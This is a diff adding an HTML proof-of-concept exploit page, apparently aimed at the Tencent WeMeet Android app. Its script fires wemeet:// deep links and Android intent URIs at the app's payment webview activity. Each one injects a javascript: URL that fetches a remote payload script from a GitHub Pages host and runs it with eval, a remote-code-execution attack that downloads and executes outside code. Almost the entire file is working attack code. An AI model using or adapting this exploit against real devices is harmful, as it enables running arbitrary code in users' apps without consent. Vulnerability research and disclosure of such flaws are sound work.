@@ -1,0 +1,23 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P78</title></head>
+<body><h1>P78</h1>
+<script>
+document.title='P78-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var js='javascript:void(fetch("https://gitwhs.github.io/wm-poc-rce/p78pay.js").then(function(r){return r.text()}).then(eval))';
+function frame(src,label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/pay/main_process_webview?url='+encodeURIComponent(official),'P78-PAYOFF'); }, 900);
+setTimeout(function(){
+  frame('intent:#Intent;component=com.tencent.wemeet.app/com.tencent.wemeet.components.webcore.activity.MainProcessPayBrowserActivity;launchFlags=0x20000000;S.url='+js+';end','P78-INTENT');
+}, 1800);
+setTimeout(function(){
+  frame('intent://page/pay/main_process_webview?url='+encodeURIComponent(js)+'#Intent;scheme=wemeet;package=com.tencent.wemeet.app;launchFlags=0x20000000;S.url='+js+';end','P78-INTENT2');
+}, 2400);
+setTimeout(function(){ document.title='P78-WAIT'; }, 50000);
+</script>
+</body></html>
